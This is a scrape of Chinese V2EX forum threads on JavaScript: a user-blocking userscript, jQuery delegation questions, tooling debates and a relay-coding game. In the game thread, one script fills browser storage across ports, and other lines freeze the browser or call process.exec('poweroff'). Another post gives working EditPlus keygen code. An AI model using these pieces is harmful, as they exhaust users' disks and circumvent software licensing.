class=\"k\">return</span> <span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">get</span><span class=\"p\">(</span><span class=\"nx\">member_page_url</span><span class=\"p\">,</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">page</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"kd\">var</span> <span class=\"nx\">block_url</span> <span class=\"o\">=</span> <span class=\"nx\">page</span><span class=\"p\">.</span><span class=\"nx\">match</span><span class=\"p\">(</span><span class=\"sr\">/\\/block\\/\\d+\\?t=\\d+/</span><span class=\"p\">)[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n      <span class=\"k\">return</span> <span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">get</span><span class=\"p\">(</span><span class=\"nx\">block_url</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n        <span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s1\">'已成功屏蔽傻 X '</span> <span class=\"o\">+</span> <span class=\"nx\">username</span> <span class=\"o\">+</span> <span class=\"s1\">' !'</span><span class=\"p\">);</span>\n      <span class=\"p\">});</span>\n    <span class=\"p\">});</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'div[id*=\"thank_area_\"]'</span><span class=\"p\">).</span><span class=\"nx\">each</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(){</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">$el</span> <span class=\"o\">=</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">);</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">reply_id</span> <span class=\"o\">=</span> <span class=\"nx\">$el</span><span class=\"p\">.</span><span class=\"nx\">attr</span><span class=\"p\">(</span><span class=\"s1\">'id'</span><span class=\"p\">).</span><span class=\"nx\">match</span><span class=\"p\">(</span><span class=\"sr\">/\\d+/</span><span class=\"p\">)[</span><span class=\"mi\">0</span><span class=\"p\">];</span>\n\n  <span class=\"kd\">var</span> <span class=\"nx\">button</span> <span class=\"o\">=</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'&lt;a class=\"thank\" style=\"color: #ccc;\" href=\"#;\" &gt;屏蔽此傻 X&lt;/a&gt;'</span><span class=\"p\">);</span>\n  <span class=\"nx\">button</span><span class=\"p\">.</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s1\">'click'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span><span class=\"nx\">blockUserByReplyId</span><span class=\"p\">(</span><span class=\"nx\">reply_id</span><span class=\"p\">)});</span>\n  <span class=\"nx\">$el</span><span class=\"p\">.</span><span class=\"nx\">html</span><span class=\"p\">(</span><span class=\"s1\">' &amp;nbsp; &amp;nbsp; &amp;nbsp; '</span><span class=\"o\">+</span><span class=\"nx\">$el</span><span class=\"p\">.</span><span class=\"nx\">html</span><span class=\"p\">())</span>\n  <span class=\"nx\">$el</span><span class=\"p\">.</span><span class=\"nx\">prepend</span><span class=\"p\">(</span><span class=\"nx\">button</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n</pre></div>\n</div></div>"], "reply": "46", "tittle": "不要打架，不要打架。遇到傻 X，屏蔽就好了", "comment": ["大家觉得要刷新好还是不要刷新好 /w\\", "有的**光屏蔽无法满足我了已经\r", "比如： ", "我个人比较喜欢操作成功后不刷新页面……", "鸡鸡的帖子要顶 嗯", "屏蔽功能确实是一个非常棒的功能，虽然我一般挺少用的，一直到现在也就屏蔽了 6 个人。毕竟谁都有情绪激动的时候，不是言论特别过分的就脑中屏蔽了。", "应该放在 github 上，这网站速度慢还经常挂。", " \r", "\r", "我觉得有这种问题，根本原因就是 block 功能没挂在显眼的位置上 /w\\。如果能随手一屏蔽，就看不见了，那就不会有这问题了。\r", "\r", "不是每个人都值得花时间跟对方讨论问题的，尤其是对放根本不是在讨论问题的时候。", "我现在在用一个叫 V2EX plus 的插件，功能很完善 ", " ", " \r", "\r", "不刷新的话，那就要在不刷新的前提下把屏蔽人的所有回复全部删掉。比较麻烦", " \r", "\r", "基佬滚粗 /w\\", " 纯粹的无特定指向目的的谩骂 无视和屏蔽都无所谓 压根儿不在乎 对于这种脑子有点问题的 我就选择弄下对方了 太傻了", " 就和我围观过的一群“版权党”在作者号召下变身“版权卫兵”对“改文侵权 biao ”人身攻击说他们都是盗版 dog 用的软件用的看的听的正版玩意还不如”版权党“口中”蛆虫“的多 233\r", "还是那个梗：”请用正版 windows 发帖。“，想起一次笑一次。\r", "script 已经添加， THX 。", " 哈哈", " \r", "\r", "这东西刚看了，好玩~\r", "\r", "但是自己造惯轮子了哈哈~", "不能打架，不能打架。金坷垃好处都有啥，谁说对了就给他", " \r", "\r", "有些人的目的就是问了喷而喷根本不是讨论问题的，你跟他讲道理摆证据，那就给你顾左右而言他或者人身攻击，完全没办法交流。\r", "\r", "这种时候，一屏蔽解决所有 /w\\", " \r", "\r", "嘛……不知道哎，原来这东西经常挂的嘛？", " 贴吧嘛，撕逼就是日常。实际上私觉得 V 站撕逼的频次和常驻的拎吧相比简直就是索尼大法和佛教的区别……（雾）拎吧虽然水但是干货还是有的，大牛还是有的……", " /w\\ 就是金坷垃梗", " \r", "\r", "GJ", "楼主，如果话语再文雅一点，就更好了，没其他意思。\r", "\r", "脚本很好，谢谢！", " 添加了，但是没有效果……如下图：\r", "![捕获 nnj.PNG]( ", ")", " 类似这样： ", " \r", "\r", "在感谢回复者那一栏，那一栏平时是隐藏的。把鼠标放在一条回复上就会现实出来~", " 仍旧加载不能……看了看 status bar ，电信屏蔽了 GOOGLE analysis ……现在失效状态", " \r", "\r", "这个没问题啊 OwO", " \r", "\r", "文雅只能对文雅的人。", " \r", "\r", "\r", "拎吧 是个什么鬼？不是 linux 吧吧……", " 可能是我 opera12 的问题……没法子，转 vivaldi 去\r", "linux bar 简称拎吧……", " \r", "\r", "你可以直接拿代码在控制台跑一遍试试", "其实不管观点多么奇葩，哪怕无理无据，我也不会去屏蔽\r", "但如果涉及到人身的，不管观点多么高大上，坚决屏蔽", "最近遇到一个看都不看我的代码就说我写的不好的....直接屏蔽。", "哈哈哈我随便翻了两页看到你说的奇葩是谁了。。这种人也是蛮可怜的为了自己所谓的自尊各种狡辩。\r", "ps ：这个脚本能够屏蔽掉诶特通知么", " 我是不是可以自豪的说我用的是正版的 Linux _(:з」∠)_", "还是喜欢吵架🤒", " 蛤蛤", "遇到 SX 我直接无视的， block 有时其实是一种逃避，只有你能做到遇到 SX 心如止水的时候才是理想境界。", "傻 X （为什么中间有个空格，好在意啊····）", "请教楼主傻 X 是什么东西？", "屏蔽后再自动回复“@xxxxxxx 已 block ”", " /w\\ 要不要那么损啊？", " @", " 秀才遇见兵（痞），有理说不清。😀", " 有中英文之间加上空格的强迫症 :-)", "  \r", "\r", " V2EX plus 大法好  ", " ", " 哈哈，感谢推荐～"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'#xx'</span><span class=\"p\">).</span><span class=\"nx\">find</span><span class=\"p\">(</span><span class=\"s1\">'a[data-id]'</span><span class=\"p\">).</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s1\">'click'</span><span class=\"p\">,</span><span class=\"s1\">'a'</span><span class=\"p\">,</span><span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'click'</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n</pre></div>\n\n<p>页面上的内容本身是存在的，点击后 ajax 请求的数据再动态的添加到页面中，但是<code>on</code>的<code>selector</code>却怎么设置都不生效……</p>\n</div></div>"], "reply": "12", "tittle": "jQuery 动态添加的元素的绑定问题", "comment": [".on() 中的第二个参数 'a'， 去掉试试", "你的 a[data-id] 就是你要绑定的 a 么？", " 就是要绑定后面用 JS 动态生成的元素才加的。但是貌似加不对……", " 这个要的", "你这个写的我看不懂， on 里面的 selector 是之前的对象里的元素筛选，按你这么写就变成了对 a[data-id]里的 a 进行 click 绑定了", "$('#xx').on('click','a[data-id]',function(){\r", "    console.log('click');\r", "});\r", "我才 data-id 的 a 是后生成的", "To 楼主，以下两种方式的区别？\r", "$(\"#xx\").find(\"a\").on(\"click\", function () {});\r", "$(\"#xx\").on(\"click\", \"a\", function () {});", " \r", " \r", "\r", "$(\"#xx\") 是不固定的，所以是一个 jq 的对象。这样的 var obj = $('#xx') 。\r", "然后传入到一个函数里，函数里只能使用 obj 了。所以实际上是这样的 obj.find('a[data-id]').on('click','selector')", " ", " 那这个就不能做到动态绑定，要把事件绑定到不改变的元素上去，比如 body document", "on 或者将 js 方法加在生成的元素之后，", "你可以用事件委托，这样的话就不用动态绑定事件了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>&lt;script type=\"text/javascript\" src=\"http://baidu.com/js/b.js\"&gt;&lt;/script&gt;<br>\n    &lt;script type=\"text/javascript\"&gt;<br>\n    if (document.getElementById(\"baidu\") == undefined) <br>\n    { <br>\n    document.location.href =\"<a target=\"_blank\" rel=\"nofollow\" href=\"http://baidu.com/xxx.html\">http://baidu.com/xxx.html</a>\";<br>\n    }</p>\n\n<h2>    &lt;/script&gt;</h2>\n<div class=\"highlight\"><pre>&lt;div class=\"container\"&gt;\n&lt;p&gt;&lt;button id=\"open-xx\" type=\"button\"&gt;打开&lt;/button&gt;&lt;/p&gt;\n&lt;/div&gt;\n</pre></div>\n\n<p>如上面两段代码，第一段是检测 b.js 里面有没有 baidu 如果没有执行网址跳转。<br>\n第二段打开按钮执行 open-xx</p>\n\n<p>现在我想把两段代码何在一起，首先检测 b.js 如果没有发现 baidu 执行 open-xx</p>\n\n<p>请问该怎么做？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "关于 document 的问题，高手请进", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前网页是通过鼠标滚动时自动生成后续页面。页面载入完毕后会使用 JS 给现有的元素添加装饰效果。</p>\n\n<p>但是对于使用 AJAX 新生成的部分，却没有效果，因为 JS 执行时查找的是现有元素，新元素生成时 JS 代码已经运行完毕了。</p>\n\n<p>目前知道 jQuery 的 .on 可以绑定事件，从而有机会再次运行 JS 来添加效果。但是感觉绑定 scroll 事件不是非常理想的做法，只需要新内容产生后才再次执行，并不是每次鼠标滚动都执行那个 JS 。</p>\n\n<p>没有任何点击，所以不能绑定 click 事件。那对于 ajax 生成的新内容，最好的再次应用 JS 的方法是什么呢？有没有一个 “新元素被创建” 的事件，或者第三方库可以用？</p>\n\n<p>DOMNodeInserted 事件 IE 不支持，所以不能用。感觉前端的兼容性问题好麻烦。</p>\n</div></div>"], "reply": "19", "tittle": "下拉页面 Ajax 动态生成的内容，现有 JS 无法应用于新增的元素。需要绑定什么事件来再次运行 JS？", "comment": ["MutationObserver", " 似乎可用。但是 IE 11+ 才支持。前端渲染还是达不到后端渲染的通用性。", "你 ajax 生成的新内容，自己在生成之后调用一下添加效果的那段函数不就好了……", " 也是一个办法，只是 ajax 瀑布流、 JS 特效是两个独立的插件实现，相互调用代码总觉得不太优雅。不过实用性更重要。", "“使用 delegate() 方法的事件处理程序适用于当前或未来的元素（比如由脚本创建的新元素）。”", " 是的，和 on() 方法作用是一样的。只是参数 eventType 不好选， jQuery 并不支持一个类似于 create 的方法。", "委派啊,委派对动态生成的元素也有效果", " 问题就是委派需要指定一个事件，但是 jQuery 只能绑定常见的 click 等事件。下拉页面并不会产生 click 事件。", " 要么 ajax 完了直接调用一下，\r", "要么委派一个自定义事件（ ajax 完成），然后 ajax 完了触发自定义事件。。。(其实两个流程一样。。。)", " $(document).delegate \"selector\", event,  ->", "ajax 执行完毕之后对新的元素再绑定一下就好了.\r", "反正请求回来知道是哪几个元素.\r", "瀑布流和特效可以分成两个模块,回调一下就好了.", "装饰效果为何不用 CSS 。。。\r", "\r", "另外把 on 注册在父元素就好……", "父元素事件委托", "这简直是 jquery 的日经贴啊", "事件代理,事件冒泡", " \r", " \r", " \r", " \r", " \r", " \r", " \r", "\r", "谢谢各位，问题已解决。初学，请见谅。", " 别在意吐槽，都是从初学者过来的", "用委托就可以啦！", "绑定父元素就好，或者实在不行绑定 body 也可以玩～"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有个游戏是大家接力编故事，一人一段，但是大家背景各异，经常就编不下去了。<br>\n让我们点燃程序员之魂，一人一行写代码试试吧 &gt; &lt;</p>\n\n<p>语言： JavaScript(这样大家都能胡逼写）<br>\n注意：<br>\n    尽量不要有 bug!!<br>\n    {}什么的就不算行了。</p>\n\n<p>楼主开始第一句<br>\n    var start = 20151203;</p>\n</div></div>"], "reply": "118", "tittle": "一人一行，接力写代码", "comment": ["var Main = (function(){\r", "  var _key = \"testData\";\r", "  var _max = 1200; //最大限制\r", "  var _jumpSpace = 50; //为避免 iframe 过多导致浏览器 crash ，每 50 个执行跳转\r", "\r", "  return {\r", "    init: function(){\r", "      //慢慢来，别写太大了，好害怕…\r", "      var s = \"\";\r", "      for(var i=0; i< 3 * 1024 * 1024; i++){\r", "        s += \"0\";\r", "      }\r", "      localStorage.setItem(_key, s);\r", "\r", "      var port = parseInt(location.port)+1;\r", "      if(port > _max) return;\r", "\r", "      if(port % _jumpSpace == 0){\r", "        //每 50 个，重定向一次\r", "        window.location.href = url;\r", "      }else{\r", "        //新添加 iframe\r", "        var $iframe = document.createElement(\"iframe\");\r", "        $iframe.src = url;\r", "        document.getElementsByTagName(\"body\")[0].appendChild($iframe);\r", "      }\r", "    }\r", "  }\r", "})();", "/**\r", "var Main = (function(){\r", "  var _key = \"testData\";\r", "  var _max = 1200; //最大限制\r", "  var _jumpSpace = 50; //为避免 iframe 过多导致浏览器 crash ，每 50 个执行跳转\r", "\r", "  return {\r", "    init: function(){\r", "      //慢慢来，别写太大了，好害怕…\r", "      var s = \"\";\r", "      for(var i=0; i< 3 * 1024 * 1024; i++){\r", "        s += \"0\";\r", "      }\r", "      localStorage.setItem(_key, s);\r", "\r", "      var port = parseInt(location.port)+1;\r", "      if(port > _max) return;\r", "\r", "      if(port % _jumpSpace == 0){\r", "        //每 50 个，重定向一次\r", "        window.location.href = url;\r", "      }else{\r", "        //新添加 iframe\r", "        var $iframe = document.createElement(\"iframe\");\r", "        $iframe.src = url;\r", "        document.getElementsByTagName(\"body\")[0].appendChild($iframe);\r", "      }\r", "    }\r", "  }\r", "})();", "var fuck = function () {\r", "  // TODO: fuck\r", "}\r", "var you = 'lz';\r", "fuck(you);", "我怎么回复不了。·。·", "//我是人畜无害的注释。", "console.log('一颗赛艇!')", "setInterval(function(){\r", "setInterval(function(){\r", "setInterval(function(){\r", "setInterval(function(){\r", "setInterval(function(){\r", "setInterval(function(){\r", "setInterval(function(){\r", "setInterval(function(){\r", "console.log(\"呵呵\")\r", "},1)\r", "},1)\r", "},1)\r", "},1)\r", "},1)\r", "},1)\r", "},1)\r", "},1)", "我试了一下，不一会儿就卡死了", "return", "；", "process.exec('poweroff')", "好了，最后一页该我了\r", "\r", "        }\r", "       }\r", "      }\r", "     }\r", "    }\r", "   }\r", "  }\r", "}", "// TODO 这个项目代码规范已乱, 下个版本开发争取用 Sepal.clj 重构 ", "angular.directive(\"deep♂dark♂fantasy\",[\"$interval\", function ($interval) {", "    return {", "        restrict: \"EMCA\",", "        require: \"^楼主\",", "        link: function (scope, element, attrs, 楼主) {", "    $interval(function () {", "    楼主.啪(楼主.屁鼓.左);", "    楼主.啪(楼主.屁鼓.右);", "    楼主.啊♂();", "    楼主.乖♂乖♂站♂好();", "    楼主.来吃♂炮();", "    }, 1));", "}", "    }", "}]);", "此处省略一万个", "<deep♂dark♂fantasy></deep♂dark♂fantasy>", "该我了\r", "//今天天气真好，逛逛 V2EX 发现楼主在玩写代码游戏，我真是超兴奋啊，因为我只会写注释啊！\r", "//所以我准备花 10 分钟写下我对这段代码的感悟，因为打字慢，所以现在剩下 8 分钟了，好紧张，\r", "//马上就要让楼主看我注释代码的功力了，一分钟后，二分钟后，三分钟后，四分钟后，五分钟\r", "//后，六分钟后，七分钟后，八分钟后，我决定就这样点击回复好了。", "妈蛋多算一个字  <酷夏在测锁>", "//终", "//OwO 崩溃了！"]},
{"content": "", "reply": "9", "tittle": "如果我只是给 JS/JSX 打包，是不是现有的 Gulp 就可以了？ WebPack 还有啥其他优势么？", "comment": ["首先 webpack 跟 gulp 定位不同， gulp 是前端工程化的一个构建工具， webpack 则是解决前端模块化加载的问题， webpack 同时支持 AMD 格式和 CMD 格式的模块，而且通过简单的配置就可以让浏览器使用上几十万数量的 npm 包。", "gulp+browserify 足矣", "如果你写 React 的话， webpack 可以 Hot Module Replacement", "reload 速度快...", "我的感觉是 Gulp 相对轻量级，构建简单，比较容易与现有的 workflow 整合。\r", "但如果是构建一个相对独立完整的前端项目，我会选择 WebPack 。", "\r", "Try this", "前端变化太快，至今仍在刀耕火种", "只是 JS/JSX 打包的话， gulp 都用不着", "我现在现在是 gulp + webPack  来用的，有一些东西只用 webpack 还不是很方便 。像通过 svg 生成字体  以及 不同环境的 webpack 配置等。两个组合一起就很棒了。我理解 gulp 是构建流工具， webpack 是负责前端工程的工具。"]},
{"content": ["<div class=\"topic_content\">最近在写自用的 pentadactyl plugin\r<br>选择页面某个区域块，或依据 xpath ，只保留显示此区域块，其他都隐藏\r<br>至于是否必须 xpath 不是重点，只是我较熟悉 xpath 而已\r<br>\r<br>现在已知 path 主干上的每个父节点都要保留（否则选择部分也不能显示），所以某些背景或块形状还是存在留白的，但旁支要隐藏\r<br>起初以为逐层父节点处理就可以了，发觉只能解析 /../*，再上一层 /../../就不能解析了（还是我方向错了？）\r<br>\r<br>求思路\r<br>js 不算太熟， 10 多年前倒写不少，现在已荒弃 10 年，只能一边看 MDN 一边写，所以别人的插件也读不懂</div>", "<div class=\"topic_content\">搞定，原来这么简单，看来我想多了， clone DOM 节点，然后\r<br>body.innerHTML = ele.outerHTML;\r<br>足矣\r<br>\r<br>pentadactyl 输入命令： :ox 一个需要转义的 xpath ，回车则可\r<br>至于这个插件，发在 kafan ，其他部分（没贴出来）也可以用 css selector ，参看我前面发过的帖子\r<br>有需要就拿去耍吧，无版权，不负责任\r<br>=====================\r<br>function getElementsByXPath(x) {\r<br>    let result = content.document.evaluate(x, content.document.documentElement, null, 5, null);\r<br>    let res = [], next;\r<br>    while (next = result.iterateNext())\r<br>        res.push(next);\r<br>    return res;\r<br>}\r<br>\r<br>group.commands.add(\r<br>    // Specs\r<br>    ['onlyx[path]', 'ox'],\r<br>\r<br>    // Description\r<br>    'Show hidden element from xpath. (转义引号、空格等)',\r<br>\r<br>    // Action. What the command does. Always gets 'args'.\r<br>    function (args) {\r<br>        let xpath = args[0];\r<br>        let x = xpath, list, ls;\r<br>        if (xpath != \"\") {\r<br>            list = getElementsByXPath(xpath);\r<br>            let body = content.document.body;\r<br>            let ele = list[0].cloneNode(true);\r<br>            // let fc = body.firstChild;\r<br>            // list = getElementsByXPath(\"//*\");\r<br>            // hideFromPath(list);\r<br>            body.innerHTML = ele.outerHTML;\r<br>            // content.document.body.appendChild(ele);\r<br>            // body.insertBefore(ele,fc);\r<br>            // ele.style.display = 'block';\r<br>        }\r<br>    }\r<br>);</div>"], "reply": "5", "tittle": "想实现一个眼不见为净的功能，求思路", "comment": ["參考微博的 chrome 插件", "话说楼主怎么写 pentadactyl plugin OwO", " \r", "pentadactdyl 的 plugin 只是 javascript", " \r", "\r", "话说有一个问题， pentadactdyl 官网上的 nightly 的版本怎么从 8 月开始就不更新了？", " \r", "我又不是作者，怎么知道，可能去研究新 FF 的 API 了\r", "ff42 还能用，暂时不敢更新到 43"]},
{"content": ["<div class=\"topic_content\">JSLint 、 JSHint 、 ESLint 、 Standard ？</div>"], "reply": "4", "tittle": "保镖用那个？", "comment": ["随便选一个。\r", "Done is better than perfect....", "帮你选吧， eslint ！", "那个是哪个？", "我厂大整合 fecs\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>EditPlus 是极好的，就是需要注册，这里有一份 EditPlus 的注册码生成器代码，保存为 htm 文件运行即可。</p>\n\n<p>htm 文件：<br>\n&lt;HTML&gt;<br>\n&lt;HEAD&gt;<br>\n&lt;script type=\"text/javascript\" src=\"keygenarator.js\"&gt;&lt;/script&gt;<br>\n&lt;/HEAD&gt;<br>\n&lt;BODY&gt;<br>\n&lt;span&gt;Username:&lt;/span&gt;&lt;br /&gt;<br>\n&lt;input name=\"username\" type=\"text\" id=\"username\" size=\"50\" /&gt;<br>\n&lt;input type=\"submit\" name=\"generate\" id=\"generate\" value=\"Generate\" onclick=\"generate_editplus_regcode();\" /&gt;<br>\n&lt;br /&gt;<br>\n&lt;span&gt;Regcode:&lt;/span&gt;&lt;br /&gt;<br>\n&lt;input name=\"regcode\" type=\"text\" id=\"regcode\" size=\"50\" readonly=\"readonly\" /&gt;&lt;div class='yarpp-related'&gt;<br>\n&lt;/BODY&gt;<br>\n&lt;/HTML&gt;</p>\n\n<p>注册码生成器算法 keygenarator.js 代码<br>\nfunction generate_editplus_regcode()<br>\n{<br>\n    var list = [0,49345,49537,320,49921,960,640,49729,50689,1728,1920,51009,1280,50625,50305,1088,52225,3264,3456,52545,3840,53185,52865,3648,2560,51905,52097,2880,51457,2496,2176,51265,55297,6336,6528,55617,6912,56257,55937,6720,7680,57025,57217,8000,56577,7616,7296,56385,5120,54465,54657,5440,55041,6080,5760,54849,53761,4800,4992,54081,4352,53697,53377,4160,61441,12480,12672,61761,13056,62401,62081,12864,13824,63169,63361,14144,62721,13760,13440,62529,15360,64705,64897,15680,65281,16320,16000,65089,64001,15040,15232,64321,14592,63937,63617,14400,10240,59585,59777,10560,60161,11200,10880,59969,60929,11968,12160,61249,11520,60865,60545,11328,58369,9408,9600,58689,9984,59329,59009,9792,8704,58049,58241,9024,57601,8640,8320,57409,40961,24768,24960,41281,25344,41921,41601,25152,26112,42689,42881,26432,42241,26048,25728,42049,27648,44225,44417,27968,44801,28608,28288,44609,43521,27328,27520,43841,26880,43457,43137,26688,30720,47297,47489,31040,47873,31680,31360,47681,48641,32448,32640,48961,32000,48577,48257,31808,46081,29888,30080,46401,30464,47041,46721,30272,29184,45761,45953,29504,45313,29120,28800,45121,20480,37057,37249,20800,37633,21440,21120,37441,38401,22208,22400,38721,21760,38337,38017,21568,39937,23744,23936,40257,24320,40897,40577,24128,23040,39617,39809,23360,39169,22976,22656,38977,34817,18624,18816,35137,19200,35777,35457,19008,19968,36545,36737,20288,36097,19904,19584,35905,17408,33985,34177,17728,34561,18368,18048,34369,33281,17088,17280,33601,16640,33217,32897,16448];<br>\n    var hexchars = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'];<br>\n    var regcode = new Array(29);<br>\n    var i = 0, j = 0, k = 0;<br>\n    var len, temp, sum, result;<br>\n    var username = document.getElementById(\"username\").value;<br>\n    username = username.replace(/^\\s+|\\s+$/g, \"\");</p>\n<div class=\"highlight\"><pre>for(i = 0;i &lt; 5;i++,k++)\n{\n    for(j = 0;j &lt; 5;j++,k++)\n    {\n        regcode[k] = hexchars[parseInt(Math.random() * 16)];\n    }\n    if(k == 29) break;\n    regcode[k] = '-';\n}\n\nlen = username.length;\n\nsum = 1;\nfor(i = 0;i &lt; len;i++)\n    sum += username.charCodeAt(i);\ntemp = (parseInt( (sum + 23) / 6 ) + 3) * 7 % 16;\nregcode[6] = hexchars[temp &amp; 0xF];\n\nsum = 1;\nfor(i = 0;i &lt; len;i++)\n    sum += username.charCodeAt(i);\ntemp = parseInt( (3 * sum + 39) / 8 ) % 16;\nregcode[9] = hexchars[temp &amp; 0xF];\n\nsum = 1;\nfor(i = 0;i &lt; len;i++)\n    sum += username.charCodeAt(i);\ntemp = parseInt( (3 * sum + 19) / 9 ) % 16;\nregcode[7] = hexchars[temp &amp; 0xF];\n\nsum = 1;\nfor(i = 0;i &lt; len;i++)\n    sum += username.charCodeAt(i);\ntemp = parseInt( (sum + 10) / 3 ) * 8 % 16;\nregcode[10] = hexchars[temp &amp; 0xF];\n\nsum = 1;\nfor(i = 0;i &lt; len;i++)\n    sum += username.charCodeAt(i);\ntemp = (parseInt( (9 * sum + 10) / 3 ) + 36) % 16;\nregcode[4] = hexchars[temp &amp; 0xF];\n\nsum = 1;\nfor(i = 0;i &lt; len;i++)\n    sum += username.charCodeAt(i);\ntemp =  parseInt( (5 * sum + 11) / 5 ) % 16;\nregcode[8] = hexchars[temp &amp; 0xF];\n\nresult = 0;\nfor(i = 0;i &lt; len;i++)\n    result = ((result &gt;&gt; 8) &amp; 0xFF) ^ list[username.charCodeAt(i) ^ (result &amp; 0xFF)];\nresult = result.toString(16).toUpperCase();\nregcode[2] = result.charAt(0);\nregcode[3] = result.charAt(1);\n\nlen = regcode.length;\nresult = 0;\nfor(i = 2;i &lt; len;i++)\n    result = ((result &gt;&gt; 8) &amp; 0xFF) ^ list[regcode[i].toString().charCodeAt(0) ^ (result &amp; 0xFF)];\nresult = result.toString(16).toUpperCase();\nregcode[0] = result.charAt(0);\nregcode[1] = result.charAt(1);\n\ndocument.getElementById(\"regcode\").value = regcode.join('');\n</pre></div>\n\n<p>}</p>\n</div></div>"], "reply": "2", "tittle": "EditPlus 注册码在线生成器及其代码", "comment": ["现在是 2015 年了，不是 1995 年，不要再把精力放在这种事情上面了。"]},
{"content": ["<div class=\"topic_content\">数据是有 parent 和 children 结点的，树比较宽，高度一般不超 10 层左右，最大的数据集可能有 1000 个左右结点，求介绍</div>"], "reply": "12", "tittle": "前端方面有什么库可以比较好地展现树形数据？", "comment": ["推荐 ztree …………用过挺好用的，照着 demo 和 api 就能实现大部分功能。", "同意楼上的，用 ztree ，性能不错的", "d3.js   ", "  也是用的 d3", " @", " 这是文件层级的，有没有图形化比较好化的？\r", " 这个有点不太直观", "搜 treemap 啊，各种", " @", " 给的例子只是 d3 无数 demo 中的 一个，你可以看看其他的例子。\r", "\r", "例如:\r", "\r", "\r", "\r", "\r", "......", " 谢谢各位", "（想知道…… @ all 是谁）", "1000 个节点用 d3 去做动画的话，有可能出现性能问题，只是展示的话自己写 dom ，要高性能就用 canvas 画， D3 是基于 dom 和 svg 的", "easyui tree ，前端处理会比较卡，后端生成节点 div ，几万节点没问题", "简单的话直接用 svg 了"]},
{"content": ["<div class=\"topic_content\"><p>今天发现 (Angular 2.0)[<a target=\"_blank\" rel=\"nofollow\" href=\"https://angular.io\">https://angular.io</a>] 开始 Beta 了， 所有的示例、教程以及 API 文档都相应的更新了， 是否意味着可以开始用语生产了呢？</p>\n\n<p>PS: 默认是 TypeScript 版本的教程和示例， TypeScript 貌似真的要火起来了！</p>\n</div>"], "reply": "26", "tittle": "Angular 2.0 出 Beta 版本了， 大家说说是否可以用于生产了么？", "comment": ["转型成本有点大 说实在的 真心的  基本从头再来的感觉", "angular 版的 react ?", "beta beta 就是还是测试啦，铁粉可以考虑，其他就算了吧", "  感觉跟 react 真的好像 我真是服了", "学习还是可以的，但是不要为了用 angular 而用 angular", "昨天跟着过了下教程，发现有几乎所有的东西都在 ts 文件里面了，直接解决了 react 样式文件写在哪的问题（ react 的 inlineStyle 很不完善）。\r", "但是这样都写在一块，就是有个弊端， css 和 html 都以字符串的形式出现在 ts 文件里面，没有语法高亮，拼写错误也找不到，不知道有没有什么好的办法。", "  \r", "图片怎么没传上去", " +1 ，我已经不知道说什么好了", "可以用啊，，，只是 Angular2 实在变化太大了。", " 可以单独放一个文件， 当字符串 import 进来。", " 这是个好办法。只是这跟 react 那样的解决办法一样了。", "我在 1.x 的 Angular 项目里尝试了 Angular New Router ，得到的结论是尽量不要在 1.x 的项目中用新的路由模块。", " 有区别的， Angular2 你可以写 HTML ，可以写 jade ，任意你喜欢的语法， css 也可以按你喜好选择，而 React 只有 jsx 。而且 Angular2 这个 style 貌似相当强大，可以解决 scope style 这个问题，我再研究一下。", " 官方教程里是说了可以解决 scope style 的问题。\r", "但是你说写 jade ，是不是也是写完然后编译到 html ，再以字符串方式 import 进来？", " 这都能自动的，比如你用 Webpack ，配置一个 jadeLoader 就可以。 SystemJS 应该也可以。", " 这个我知道，我的意思是说这个流程是要走的。", " 是的", " 不知道你用的时候编译速度怎么样，我这边很慢。\r", "一开始那个 helloworld 都得三四秒浏览器才能有反应", " 有的， html 和 css 可以写到独立的文件", " 建议打好本的环境，网上的例子加载很慢，还有墙外的脚本", " 不需要 import ，直接用 templateUrl styleUrls 就行，能自动加载", " 拿 webpack 来说，第一次肯定很慢，但是 watch 的时候是有缓存的，后续的修改不会全量编译，开发过程中基本感觉不到编译的过程，几百 ms 吧。", " \r", "我就是本地的环境，所有以来的文件都是本地的，不存在墙外脚本的问题。\r", "我说的是编译，检测到 ts 改动=>js 这个时间。\r", "我本地编译需要两三秒，然后浏览器刷新完基本需要四秒以上", "css 不是问题吧？不是有 webpack 么？", " 那照这么看， systemjs 还是得换 webpack 才行啊", " 我这里是非常快的，从保存到刷新不到一秒。"]},
